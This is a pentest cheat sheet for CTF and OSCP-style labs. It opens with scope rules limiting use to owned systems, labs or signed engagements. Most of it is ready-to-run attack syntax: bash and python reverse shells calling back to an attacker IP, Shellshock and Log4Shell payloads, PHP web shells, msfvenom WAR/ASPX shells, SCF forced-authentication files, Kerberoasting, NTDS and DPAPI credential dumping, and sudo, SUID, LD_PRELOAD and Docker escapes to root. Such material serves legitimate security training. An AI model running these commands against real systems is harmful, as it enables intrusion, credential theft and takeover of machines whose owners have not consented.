# Pentest syntax cheat sheet

Placeholders: `<ip>` target, `<host>` hostname/FQDN, `<user>` `<pass>` creds, `<domain>` AD domain, `<lhost>` your VPN IP, `<lport>` your listener port.

Set these once per box and reuse:

```bash
export IP=10.10.10.10
export LHOST=$(ip -4 addr show tun0 | grep -oP 'inet \K[\d.]+')   # your VPN IP
export LPORT=443
```

---

## Scope and tool rules (read this first)

Run this against systems you own, a lab or CTF you are registered with, or an engagement with a signed scope. Nothing else.

**On a certification exam** the tooling is usually restricted, and the OSCP rules are the strictest you are likely to meet:

Allowed: manual tools, nmap, targeted nmap scripts, one-off exploits, `netexec`, impacket, evil-winrm, Burp community, linpeas/winpeas, targeted Metasploit **on a single machine only**.

Not allowed: `sqlmap`, automated exploitation (db_autopwn, browser_autopwn), mass vulnerability scanners (Nessus, OpenVAS; Nikto is fine as it is not an exploit scanner but treat with care), and Metasploit auto-exploit beyond your one permitted box. When in doubt, do it by hand.

On a CTF or your own lab none of that applies — but working by hand is still how you learn what the automated tool was doing.

---

## Port scanning

```bash
# Fast full TCP sweep, then version + default scripts on what is open
nmap -p- --min-rate 10000 -T4 -Pn $IP -oN allports.nmap
ports=$(grep -oP '^\d+(?=/tcp)' allports.nmap | paste -sd, -)
nmap -sCV -p$ports -Pn $IP -oN detailed.nmap

# UDP (slow, top ports only)
sudo nmap -sU --top-ports 100 -T4 $IP -oN udp.nmap

# rustscan alternative (faster discovery)
rustscan -a $IP -- -sCV

# ident (113) names the user behind every open port
ident-user-enum $IP 22 80 113 3306
# port knocking - a filtered port that opens after a sequence (look in knockd.conf, a README, FTP)
knock $IP 7469 8475 9842 && ssh <user>@$IP
for p in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $p $IP; done      # no knock client needed
```

---

## FTP (21)

```bash
nmap -p21 --script ftp-anon,ftp-syst $IP
ftp $IP                       # user: anonymous  pass: anything
# inside ftp:  binary   |   prompt off   |   mget *   |   put <file>
wget -r ftp://anonymous:anon@$IP/     # pull everything
```

## SSH (22)

```bash
nmap -p22 --script ssh-auth-methods,ssh2-enum-algos $IP
ssh <user>@$IP
ssh -i id_rsa <user>@$IP      # with a found key (chmod 600 id_rsa first)
ssh2john id_rsa > hash        # crack an encrypted key
```

## SMTP (25)

```bash
nmap -p25 --script smtp-commands,smtp-enum-users $IP
smtp-user-enum -M VRFY -U users.txt -t $IP
```

## DNS (53)

```bash
dig axfr @$IP <domain>        # zone transfer
dnsrecon -d <domain> -n $IP
nslookup                      # then: server $IP  ->  <domain>
```

## Web (80/443/8080/...)

```bash
whatweb -a3 http://$IP
curl -sSik http://$IP/robots.txt
nmap -p80 --script http-enum,http-title,http-headers,http-methods $IP

# directory brute (pick one). -d 2 stops ferox recursing into a phone book
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -x php,html,txt -C 404,403
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# vhost / subdomain fuzz (add <host> to /etc/hosts first)
ffuf -u http://$IP -H "Host: FUZZ.<host>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline-size>

# WordPress
curl -s http://$IP/readme.html | grep -i version                 # core version
wpscan --url http://$IP --enumerate ap,at,u,cb,dbe --plugins-detection aggressive --api-token <token>
cmsmap -f W http://$IP                                            # alt scanner (also J/D/M); -F full, noisy
curl -s http://$IP/wp-json/wp/v2/users                           # user enum via REST API
wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login brute
# admin panel -> Appearance > Theme Editor > 404.php = PHP shell ; wp-config.php holds the DB creds

# XXE - any endpoint that parses XML (reads local files)
# <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
#   PHP source: file:///... -> php://filter/convert.base64-encode/resource=index.php

# NoSQL (Mongo) auth bypass / extract
#   username[$ne]=x&password[$ne]=x        |  username[$regex]=^admin
# Spring Boot Actuator (Java):  /actuator/env  /actuator/heapdump  /actuator/sessions
# LFI->RCE wrappers: php://filter/convert.base64-encode/resource=  data://  phar://
curl --path-as-is "http://$IP/../../../../etc/passwd"   # curl strips ../ without this; matters on loopback services
# Shellshock (/cgi-bin/*.sh):  User-Agent: () { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
# Log4Shell (any logged field):  ${jndi:ldap://<lhost>/x}     (marshalsec/JNDIExploit for the payload class)
# GraphQL introspection:  POST /graphql {"query":"{__schema{types{name fields{name}}}}"}   (InQL, graphw00f)
# Deserialization: Java ysoserial | .NET ysoserial.net ViewState | Python pickle | Node node-serialize
# WebDAV:  davtest -url http://<ip>   ;  curl -T shell.php http://<ip>/   (upload .txt then MOVE if filtered)
# writable SMB/FTP share that IS the web root: put shell, then curl it. IIS runs .aspx, Apache .php
#   msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
# Jenkins /script (Groovy):  println 'id'.execute().text
# Redis unauth -> SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x '<pubkey>' ; save
# Redis as root, nothing to key? module RCE:  module load /tmp/module.so ; system.exec 'id'   (RedisModules-ExecuteCommand)
# Ghostcat (AJP 8009, CVE-2020-1938):  python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
# RFI - include takes a URL:  ?page=http://$LHOST/shell.txt
#   Windows + allow_url_include=Off? UNC still works:  ?page=\\$LHOST\share\shell.php
#   impacket-smbserver share $(pwd) -smb2support     (use real samba if smbserver drops the connection)
# cmdi filter bypass: cat${IFS}/etc/passwd | {cat,/etc/passwd} | c\at /etc/pa*wd | echo Y2F0|base64 -d|sh
# PHP type juggling: password[]=x (array -> NULL == 0) | 0e magic hashes compare equal ('0e12' == '0e99')
# upload filter blocks .php? teach Apache a new extension instead:
#   printf 'AddType application/x-httpd-php .zzz\n' > .htaccess   (upload it, then shell.zzz)
#   php_flag engine on      - re-enables PHP where it was disabled for that folder
# upload is parsed server-side? hit the parser: exiftool CVE-2021-22204 (DjVu), ImageMagick CVE-2022-44268
# Jupyter on 8888: New > Terminal is a shell. Token leaks in configs/history/ps
#   curl -s http://<ip>:8888/api/sessions

# Tomcat Manager -> WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
curl -u tomcat:s3cret -T rev.war "http://$IP:8080/manager/text/deploy?path=/rev"
curl "http://$IP:8080/rev/"       # listener up first

# PHP shells to upload
echo '<?php system($_GET["cmd"]); ?>' > cmd.php          # then browse cmd.php?cmd=id
cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # edit $ip/$port, upload, nc -lvnp <port>, browse it
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
```

Reminder: if the browser redirects to a name, `echo "$IP <host>" | sudo tee -a /etc/hosts`.

## SMB (139/445)

```bash
nxc smb $IP                                   # OS / domain / signing
nxc smb $IP -u '' -p '' --shares              # null session
nxc smb $IP -u guest -p '' --shares
nxc smb $IP -u <user> -p <pass> --shares
enum4linux-ng -A $IP
smbmap -H $IP -u guest -p ''
smbclient -L //$IP/ -N                         # list shares
smbclient //$IP/<share> -N                     # connect (or -U '<user>%<pass>')
smbclient //$IP/<share> -N -c 'recurse ON; ls' # walk a share

# password spray / cred check across a subnet
nxc smb $IP -u users.txt -p 'Password1' --continue-on-success
```

## SNMP (161/udp)

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
snmpwalk -v2c -c public $IP
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2   # running processes
```

## LDAP (389/636)

```bash
nmap -p389 --script ldap-rootdse $IP
ldapsearch -x -H ldap://$IP -s base -b '' namingContexts
ldapsearch -x -H ldap://$IP -b '<baseDN>' > ldap_dump.txt
```

## Databases

```bash
# MSSQL 1433
impacket-mssqlclient <user>:<pass>@$IP            # add -windows-auth for domain
# MySQL 3306
mysql -h $IP -u root -p
# PostgreSQL 5432
psql -h $IP -U postgres
# Redis 6379
redis-cli -h $IP        # then: info | keys * | config get dir
```

## RDP / WinRM

```bash
xfreerdp /v:$IP /u:<user> /p:<pass> +clipboard /dynamic-resolution
nxc winrm $IP -u <user> -p <pass>
evil-winrm -i $IP -u <user> -p <pass>
evil-winrm -i $IP -u <user> -H <ntlm-hash>       # pass-the-hash
```

## Active Directory (88 present = DC)

```bash
# GPP cpassword pulled from a share by hand (e.g. null-session Replication share)
gpp-decrypt '<cpassword>'                      # AES key is public; recovers the plaintext
nxc ldap $IP -u <user> -p <pass> --laps        # local-admin pw off the computer object
nxc ldap $IP -u <user> -p <pass> --gmsa        # gMSA managed password (or gMSADumper.py)
# SeBackupPrivilege on a DC -> NTDS.dit:
#   diskshadow (expose C: as Z:) ; robocopy /b Z:\Windows\NTDS . ntds.dit ; reg save hklm\system system
#   secretsdump.py -ntds ntds.dit -system system LOCAL
runas /user:<dom>\administrator /savecred "cmd /c whoami"   # re-use a cmdkey-stored cred
RunasCs.exe <user> <pass> "cmd /c whoami" -r $LHOST:$LPORT  # run as a user with no WinRM/RDP, from a shell
# DPAPI -> plaintext (saved RDP/network/browser creds), not a hash:
#   blobs in %APPDATA%\Microsoft\Credentials\ ; masterkey in ..\Protect\<SID>\
#   mimikatz: dpapi::masterkey /in:<mk> /sid:<SID> /password:<pw>  then  dpapi::cred /in:<blob>
#   or: impacket-dpapi credential -file <blob> -key <masterkey>
# Azure AD Connect box? ADSync DB holds a DA password it can decrypt (azuread_decrypt_msol.ps1)
dir /R                                          # NTFS alternate data streams (Get-Content f -Stream x)
# forced auth from a writable share - Explorer fetches the icon, leaking NetNTLMv2 to Responder
printf '[Shell]\nCommand=2\nIconFile=\\\\%s\\share\\x.ico\n[Taskbar]\nCommand=ToggleDesktop\n' "$LHOST" > @pwn.scf
smbclient //$IP/<share> -N -c 'put @pwn.scf'    # .url (URL=file://$LHOST/x.ico) or .lnk work too
# LDAP passback - point a printer/appliance's LDAP server at you, its bind arrives in cleartext
sudo nc -lvnp 389
```


```bash
nxc smb $IP -u '' -p '' --rid-brute 10000     # real user list from a null/guest session
nxc ldap $IP -u <user> -p <pass> -M user-desc  # description/info fields hold reset passwords
impacket-lookupsid <domain>/guest@$IP 10000   # same idea, via SID walking
kerbrute userenum -d <domain> --dc $IP users.txt
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip $IP -request               # Kerberoast
setspn.exe -Q */*                              # native SPN list, from the box, no creds to type
#   then: Invoke-Kerberoast -OutputFormat hashcat | fl   or   Rubeus.exe kerberoast /format:hashcat
# svc account hash -> Administrator on THAT service, no krbtgt/DCSync needed (silver ticket):
impacket-ticketer -nthash <svc-nt-hash> -domain-sid S-1-5-21-... -domain <dom> -spn MSSQLSvc/sql.<dom>:1433 -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache      # then any impacket tool with -k -no-pass
impacket-secretsdump <domain>/<user>:<pass>@$IP
bloodhound-python -d <domain> -u <user> -p <pass> -ns $IP -c all
```

---

## Reverse shells

```bash
# listener
nc -lvnp $LPORT
rlwrap nc -lvnp $LPORT     # nicer, with history/arrows

# bash
bash -c 'bash -i >& /dev/tcp/'$LHOST'/'$LPORT' 0>&1'
# python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Best source for one-liners in a pinch: revshells.com (run it locally, or just remember the site).

## Upgrade a dumb shell to a full TTY

```bash
# 1. ON TARGET: spawn a PTY  (no python3? use:  script -qc /bin/bash /dev/null)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. press Ctrl-Z  -> drops you to your own Kali prompt

# 3. ON KALI. Paste both lines together. Screen goes blank/no-echo, that's normal, press Enter
stty raw -echo
fg

# 4. ON TARGET: fix the environment
export TERM=xterm
export SHELL=/bin/bash

# 5. size it: run 'stty size' in a spare Kali tab to get 'rows cols', then ON TARGET:
stty rows 38 cols 190

# terminal wrecked? on Kali:  reset    (or)  stty sane
# cleanest if target has socat (perfect TTY, no stty dance):
#   kali:   socat file:$(tty),raw,echo=0 tcp-listen:4444
#   target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444
```

## File transfer

```bash
# on your box: serve the folder
python3 -m http.server 80
# on target (Linux)
wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
curl http://$LHOST/x -o /tmp/x
# on target (Windows)
certutil -urlcache -f http://$LHOST/nc.exe nc.exe
powershell -c "iwr http://$LHOST/x.exe -o x.exe"
# via SMB (Windows pull)
impacket-smbserver share . -smb2support     # your box
copy \\$LHOST\share\file.exe                 # target
```

## Privilege escalation, first moves

```bash
# Linux
./linpeas.sh | tee linpeas.txt
sudo -l
find / -perm -4000 -type f 2>/dev/null       # SUID
getcap -r / 2>/dev/null                       # capabilities (NOT shown by find -perm -4000)
# SUID entry on GTFOBins? sh/bash drop the euid unless you pass -p:
/opt/suidfind . -exec /bin/sh -p \; -quit     # and SUID interpreters:
php -r "pcntl_exec('/bin/sh', ['-p']);"       # gdb -nx -ex 'python import os; os.execl("/bin/sh","sh","-p")' -ex quit
# cap_setuid=ep on an interpreter -> set uid 0 yourself:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
crontab -l; cat /etc/crontab
# check GTFOBins for anything you find in sudo -l or SUID
./pspy64 -pf -i 1000                          # watch cron/procs as root fires them (no root needed)
sudo -u#-1 /bin/bash                           # CVE-2019-14287, when sudo -l shows (ALL, !root)
sudo --version                                 # < 1.9.5p2 -> Baron Samedit CVE-2021-3156, any local user, no sudo rule
# sudo rule naming a path/wildcard is a pattern, not a fence: (root) /bin/nice /notes/*.sh
sudo /bin/nice /notes/../tmp/rev.sh            # traverse out of it; trailing * = append your own flags
# root runs a writable thing: cron/systemd-timer script | /etc/update-motd.d/* (fires on SSH login)
# root 'tar ... *' in a writable dir -> touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'
# root job runs git in a repo you can write -> .git/hooks/pre-commit (or post-commit), chmod +x, runs as root
# restricted shell (rbash)? escape:
ssh <user>@$IP -t bash --noprofile --norc      # or from inside: vi -> :set shell=/bin/sh :shell
# NFS export with no_root_squash -> set the SUID bit from your box, it is honoured on theirs
showmount -e $IP                               # look for (rw,no_root_squash); cat /etc/exports on target
sudo mount -t nfs $IP:/export /mnt -o nolock && sudo cp /bin/bash /mnt/rootbash && sudo chmod +s /mnt/rootbash
#   then on target:  /export/rootbash -p
id                                             # disk -> debugfs /dev/sda1 (read/write any file) | adm -> /var/log | shadow
# sudo -l shows env_keep+=LD_PRELOAD -> root with ANY allowed binary, no GTFOBins entry needed
#   gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c   (x.c: void _init(){setuid(0);system("/bin/bash");})
#   sudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>
# python import hijack: root script does 'import config' and its dir is writable -> drop config.py

# Windows
.\winpeas.exe
whoami /priv                                  # look for SeImpersonate -> potato
systeminfo                                    # then windows-exploit-suggester
# PoC is C source and the target has no compiler? cross-compile on Kali:
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static   # i686-w64-mingw32-gcc for 32-bit
# AppLocker default rules allow all of C:\Windows - these live inside it and are user-writable:
#   C:\Windows\System32\spool\drivers\color | C:\Windows\Tasks | C:\Windows\Temp   (Get-AppLockerPolicy -Effective -Xml)
accesschk.exe -uwcqv <user> *                 # services you may reconfigure
sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add" && sc start <svc>
#   Server Operators group members can do the above to any service = SYSTEM, no file dropped
# open Squid proxy (3128/8080)? that is a free tunnel - proxychains conf:  http <ip> 3128
ss -tulpn                                      # then forward anything bound to 127.0.0.1 only
ssh -L 3306:127.0.0.1:3306 <user>@$IP          # loopback services are usually unauthenticated
# Windows foothold, no sshd? dial out instead - it ships an OpenSSH *client*:
ssh -R 1080 -N <user>@$LHOST                   # older boxes: plink.exe -ssh -l <u> -pw <p> -R 1080 $LHOST
netsh interface portproxy add v4tov4 listenport=9999 connectaddress=<internal> connectport=3389   # admin, no upload
```

## Container escape

```bash
# am I in a container, and which runtime?
ls -la /.dockerenv /run/.containerenv 2>/dev/null   # docker / podman
cat /proc/1/cgroup                                  # docker / lxc / kubepods
env | grep -i KUBERNETES                            # a pod

# enumerate the confinement (the escape is almost always one of these)
capsh --print 2>/dev/null; grep Cap /proc/self/status   # CAP_SYS_ADMIN / PTRACE / DAC_READ_SEARCH
ls -la /var/run/docker.sock 2>/dev/null             # mounted socket = game over
mount; fdisk -l 2>/dev/null                         # host mounts / privileged (sees host disks)
id | grep -E 'docker|lxd|lxc'                        # group membership is root-equivalent

# docker socket or docker group -> root on the host
docker run -v /:/host -it alpine chroot /host bash

# privileged container -> mount the host disk
mkdir /mnt/host; mount /dev/sda1 /mnt/host && chroot /mnt/host bash

# lxd group -> privileged container mounting /
lxc init esc r -c security.privileged=true
lxc config device add r host disk source=/ path=/mnt/root recursive=true
lxc start r; lxc exec r sh

# kubernetes pod -> node
cat /run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list            # create pods -> schedule a privileged hostPath pod

# CAP_SYS_ADMIN (AppArmor off/permissive): cgroup release_agent break-out -> HackTricks
# CVE-2019-5736: overwrite host runc from inside, fires on the next 'docker exec'
# automation: ./deepce.sh   |   cdk evaluate --full
```

## Password cracking

```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# common modes: 0 md5, 1000 ntlm, 1800 sha512crypt, 13100 kerberoast TGS
# ssh2john / zip2john / rar2john / office2john / keepass2john / pfx2john / gpg2john <file> > hash.txt
#   GPG: crack it, gpg --import key, then gpg --decrypt secret.pgp
# creds hide in file formats, not just hashes - read the artefact before cracking anything
vncpwd ~/.vnc/passwd                          # VNC: published DES key -> plaintext, no cracking
kpcli --kdb db.kdbx                           # KeePass, once you have the master password
mdb-tables b.mdb && mdb-export b.mdb users    # MS Access (mdbtools)
readpst -o out mail.pst                       # Outlook -> mbox (pst-utils)
sqlite3 app.db .dump                          # any dropped .db
# and triage every file a box hands you
exiftool f.jpg ; binwalk -e f.png ; strings -n 8 f.bin ; steghide extract -sf f.jpg
ciscot7.py -d -p <type7>                       # Cisco type 7 is reversible; type 5 = md5crypt (john)
hashcat --example-hashes | grep -i <type>      # find the right mode
```

## searchsploit

```bash
searchsploit <product> <version>
searchsploit -m <id>          # copy exploit to cwd
searchsploit -x <id>          # view it
```

---

## The loop to run on every box

1. Full TCP scan, then `-sCV` on the open ports.
2. For each service, enumerate it fully before moving on. Do not tunnel-vision on port 80.
3. Note every version string and `searchsploit` it.
4. Add hostnames to `/etc/hosts` the moment you see one.
5. Get any foothold, upgrade the shell, run peas, check `sudo -l`.
6. Keep notes as you go. Screenshot proof.txt with `type`/`cat` plus `whoami` and `ip`.
